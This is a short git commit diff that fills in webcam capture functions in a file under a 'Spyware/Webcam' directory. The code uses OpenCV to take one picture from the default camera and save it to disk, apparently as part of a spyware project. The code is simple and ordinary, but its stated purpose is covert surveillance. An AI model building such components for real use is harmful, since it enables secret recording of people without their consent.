187f4fa531b78f6b201f15c4d8f293da9fc6506b
Hjt <ronaldohjt2@gmail.com>
2024-04-01 12:06:48 +0330

    feat(camera)
    Added take_picture and save_picture functions

--- Spyware/Webcam/webcam-access.py
+++ Spyware/Webcam/webcam-access.py
@@ -1,9 +1,17 @@
-from cv2 import VideoCapture, imwrite
+from cv2 import VideoCapture, imwrite, destroyAllWindows
+from cv2.typing import MatLike
 
 
 def take_picture(path: str) -> bool:
-    ...
+    camera = VideoCapture(0)
+    status, pic = camera.read()
+    if status:
+        save_picture(path, pic)
+        camera.release()
+        destroyAllWindows()
+        return True
+    return False
 
 
-def save_picture(path, frame):
-    ...
+def save_picture(path: str, frame: MatLike) -> None:
+    imwrite(path, frame)
